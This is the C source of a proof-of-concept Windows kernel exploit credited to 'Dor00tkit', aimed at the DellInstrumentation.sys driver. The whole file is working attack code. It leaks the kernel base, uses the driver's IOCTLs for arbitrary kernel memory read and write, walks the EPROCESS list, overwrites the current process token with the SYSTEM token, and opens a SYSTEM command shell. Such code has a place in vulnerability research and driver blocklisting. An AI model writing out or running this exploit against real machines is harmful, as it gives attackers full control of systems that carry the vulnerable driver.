#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

#define OFFSET_PROCESS_LINKS 0x448
#define OFFSET_TOKEN 0x4b8

#define MAXIMUM_FILENAME_LENGTH 255 
#define SystemModuleInformation 0xb

#define IOCTL_READ 0x9b0c1ec4
#define IOCTL_WRITE 0x9b0c1ec8

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _IOCTL_STRUCT_KERNEL_READ
{
	ULONGLONG zero;
	PCHAR address;
	DWORD offset;
	DWORD unk1;
	PCHAR result;
} IOCTL_STRUCT_KERNEL_READ;

typedef struct _IOCTL_STRUCT_KERNEL_WRITE
{
	ULONGLONG zero;
	PCHAR address;
	DWORD offset;
	DWORD unk1;
	PCHAR value;
} IOCTL_STRUCT_KERNEL_WRITE;

//print error message, wait for enter and terminate
void __declspec(noreturn) error(const char* szErr)
{
	printf("[-] %s\n", szErr);

	getchar();
	exit(-1);
}

//acquire base address of ntoskrnl.exe module in kernel space
PCHAR GetKernelBase(void)
{
	//get required size of SystemModuleInformation array
	DWORD dwSize = 0;

	if (NtQuerySystemInformation(SystemModuleInformation, NULL, dwSize, &dwSize) != STATUS_INFO_LENGTH_MISMATCH)
		error("Cannot get length of system module list array");

	//alloc mem for system modules
	PSYSTEM_MODULE_INFORMATION pSystemModules = (PSYSTEM_MODULE_INFORMATION)malloc(dwSize);

	if (!pSystemModules)
		error("Cannot allocate memory for system module list");

	//query system modules
	if (!NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, pSystemModules, dwSize, &dwSize)))
		error("Cannot get system module list");

	DWORD dwCount = pSystemModules->ModulesCount;
	printf("[+] Found %d system modules\n", dwCount);

	//for each system module check its full path name for substring "ntoskrnl.exe"
	for (DWORD i = 0; i < dwCount; i++)
	{
		if (strstr((const char*)pSystemModules->Modules[i].Name, "ntoskrnl.exe"))
		{
			//now get the image base addr
			PCHAR pBase = (PCHAR)pSystemModules->Modules[i].ImageBaseAddress;

			printf("[+] Found kernel base at 0x%p\n", pBase);

			//free system module list and return leaked base address
			free(pSystemModules);
			return pBase;
		}
	}

	//this shouldn't happen
	error("Cannot find ntoskrnl.exe in system module list");
}

//arbitrary kernel memory read
PCHAR ReadKernelMemory(HANDLE hDevice, PCHAR addr)
{
	DWORD dwBytesReturned;
	IOCTL_STRUCT_KERNEL_READ ioctl_kerenl_read;
	PCHAR test = 0;
	
	ioctl_kerenl_read.zero = 0;
	ioctl_kerenl_read.address = addr;
	ioctl_kerenl_read.offset = 0;
	ioctl_kerenl_read.unk1 = 0;
	ioctl_kerenl_read.result = 0;

	if (!DeviceIoControl(hDevice, IOCTL_READ, &ioctl_kerenl_read, sizeof(ioctl_kerenl_read), &ioctl_kerenl_read, sizeof(ioctl_kerenl_read), &dwBytesReturned, NULL))
		error("Error in ioctl read command");
	
	return ioctl_kerenl_read.result; //returned value
}

//arbitrary kernel memory write <3
void WriteKernelMemory(HANDLE hDevice, PCHAR addr, PCHAR value)
{
	DWORD dwBytesReturned;
	IOCTL_STRUCT_KERNEL_WRITE ioctl_kernel_write;

	ioctl_kernel_write.zero = 0;
	ioctl_kernel_write.address = addr;
	ioctl_kernel_write.offset = 0;
	ioctl_kernel_write.unk1 = 0;
	ioctl_kernel_write.value = value;

	if (!DeviceIoControl(hDevice, IOCTL_WRITE, &ioctl_kernel_write, sizeof(ioctl_kernel_write), &ioctl_kernel_write, sizeof(ioctl_kernel_write), &dwBytesReturned, NULL))
		error("Error in ioctl write command");
}

//main console application
DWORD main(DWORD argc, CHAR* argv[])
{
	//hello world
	printf("\n******************************************\n");
	printf("DellInstrumentation.sys PoC by Dor00tkit");
	printf("\n******************************************\n\n");
	
	//load ntoskrnl.exe as resource
	HMODULE hNtOsKrnl = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);

	if (!hNtOsKrnl)
		error("Cannot load ntoskrnl.exe");

	//get addr of PsInitialSystemProcess minus base of resource plus base addr of loaded kernel = kernel address of PsInitialSystemProcess
	PCHAR PsInitialSystemProcess = (PCHAR)GetProcAddress(hNtOsKrnl, "PsInitialSystemProcess") - (PCHAR)hNtOsKrnl + GetKernelBase();

	//ntoskrnl resource is no longer needed
	FreeLibrary(hNtOsKrnl);
	printf("[+] Found PsInitialSystemProcess at 0x%p\n", PsInitialSystemProcess);
	
	//open handle to exploitable device
	HANDLE hDevice = CreateFileW(L"\\\\.\\GlobalRoot\\Device\\Dell_Instrumentation", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (hDevice == INVALID_HANDLE_VALUE)
		error("Cannot open handle to vulnerable driver, is the service running?");
	
	printf("[+] Opened vulnerable device handle 0x%p\n", hDevice);

	//using new handle read PsInitialSystemProcess to get system EPROCESS
	PCHAR SystemEPROCESS = ReadKernelMemory(hDevice, PsInitialSystemProcess);
	printf("[+] Found System EPROCESS struct at 0x%p\n", SystemEPROCESS);

	//from system EPROCESS get ActiveProcessLinks (we need to find our EPROCESS)
	PCHAR ActiveProcessLinks = ReadKernelMemory(hDevice, SystemEPROCESS + OFFSET_PROCESS_LINKS);

	//steal system token from system EPROCESS
	PCHAR SystemToken = (PCHAR)((ULONGLONG)ReadKernelMemory(hDevice, SystemEPROCESS + OFFSET_TOKEN) & 0xfffffffffffffff0);
	printf("[+] Stealing system token 0x%p\n", SystemToken);

	//now loop through ActiveProcessLinks to find our EPROCESS, UniqueProcessId is always right behind ActiveProcessLinks
	while (1)
	{
		if ((DWORD)ReadKernelMemory(hDevice, ActiveProcessLinks - 8) == GetCurrentProcessId())
		{
			//subtract ActiveProcessLinks offset to get EPROCESS
			PCHAR CurrentEPROCESS = ActiveProcessLinks - OFFSET_PROCESS_LINKS;
			printf("[+] Found current EPROCESS struct at 0x%p\n", CurrentEPROCESS);

			//finally overwrite our token to system one
			printf("[+] Overriding current token now...\n");
			WriteKernelMemory(hDevice, CurrentEPROCESS + OFFSET_TOKEN, SystemToken);

			break; //exit loop
		}

		//not current process, try next one
		ActiveProcessLinks = ReadKernelMemory(hDevice, ActiveProcessLinks);
	}

	//device is no longer needed, we are elevated
	CloseHandle(hDevice);

	//system please!
	system("cmd");

	//wait and return success
	getchar();
	return 0;
}